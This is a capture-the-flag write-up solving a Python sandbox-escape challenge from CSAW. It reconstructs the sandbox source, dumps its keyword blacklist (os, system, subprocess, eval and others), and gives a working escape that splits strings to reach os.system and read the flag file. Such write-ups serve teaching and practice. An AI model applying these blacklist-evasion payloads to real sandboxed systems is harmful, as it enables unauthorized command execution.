`Setting up a new coding environment for my data science students. Some of them are l33t h4ck3rs that got RCE and crashed my machine a few times :(. Can you help test this before I use it for my class? Two sandboxes should be better than one...`

nc pwn.chal.csaw.io 5011

[sandbox.py](./original.py)

Looking at the file it seems we have a very simple REPL, with some code prepended to every line we write. There is also a blacklist of words, which we do not have access to.

First I started by simply trying to run the file, which obviously didn't work, since I don't have "blacklist", so I just replaced `blacklist.BLACKLIST` with `[]`
Now it did run, and we have a similar shell to the remote one, but without a blacklist. Lets fix that.

```$ echo "print(blacklist.BLACKLIST)" |nc pwn.chal.csaw.io 5011
['__builtins__', '__import__', 'eval', 'exec', 'import', 'from', 'os', 'sys', 'system', 'timeit', 'base64commands', 'subprocess', 'pty', 'platform', 'open', 'read', 'write', 'dir', 'type']
```
Huh, it just worked.

```py
blacklist = ['__builtins__', '__import__', 'eval', 'exec', 'import', 'from', 'os', 'sys', 'system', 'timeit', 'base64commands', 'subprocess', 'pty', 'platform', 'open', 'read', 'write', 'dir', 'type']
```
Replace the original `blacklist.BLACKLIST` with `blacklist` and we have an equal shell to theirs.

Now, I wonder if degarbling the `final_cmd` will help?

`uOaoBPLLRN -> sandbox_fd`

`int(((54 * 8) / 16) * (1/3) - 8) -> 1`
`uDwjTIgNRU -> one`

`ORppRjAVZL -> first_line_words_array`

`AAnBLJqtRv -> second_word`

`bAfGdqzzpg -> last_word`

The second word on this file is "base64" and the last word on the first line is "b64decode"
This next line grabs the b64decode sub module and puts its reference in "HrjYMvtxwA" I won't rename this because it might be useful for blacklist evasion.

`X19pbXBvcnRfXw==` decodes to `__import__` and `bnVtcHk=` decodes to... `numpy`?? Numpy pyjail escape?

Anyway, not renaming `RMbPOQHCzt` either, numpy might be useful.

Here is the final file:
```py
#!/usr/bin/env python3
from base64 import b64decode
# import blacklist  # you don't get to see this :p
blacklist = ['__builtins__', '__import__', 'eval', 'exec', 'import', 'from', 'os', 'sys', 'system', 'timeit', 'base64commands', 'subprocess', 'pty', 'platform', 'open', 'read', 'write', 'dir', 'type']

"""
Don't worry, if you break out of this one, we have another one underneath so that you won't
wreak any havoc!
"""

def main():
    print("EduPy 3.8.2")
    while True:
        try:
            command = input(">>> ")
            if any([x in command for x in blacklist]):
                raise Exception("not allowed!!")

            final_cmd = """
sandbox_fd = open("sandbox.py", "r")
one = 1
first_line_words_array = sandbox_fd.readlines()[one].strip().split(" ")
second_word = first_line_words_array[one]
last_word = first_line_words_array[-one]
sandbox_fd.close()
HrjYMvtxwA = getattr(__import__(second_word), last_word)
RMbPOQHCzt = __builtins__.__dict__[HrjYMvtxwA(b'X19pbXBvcnRfXw==').decode('utf-8')](HrjYMvtxwA(b'bnVtcHk=').decode('utf-8'))\n""" + command
            exec(final_cmd)

        except (KeyboardInterrupt, EOFError):
            return 0
        except Exception as e:
            print(f"Exception: {e}")

if __name__ == "__main__":
    exit(main())
```

Try the classic pyjail escape, but try to accomodate for the blacklisted strings.
`print(getattr(getattr(globals()['__buil'+'tins__'], '__im'+'port__')('o'+'s'), 'sy'+'stem')('ls .'))`
Uh... It worked.

`print(getattr(getattr(globals()['__buil'+'tins__'], '__im'+'port__')('o'+'s'), 'sy'+'stem')('cat flag.txt'))`
Done!

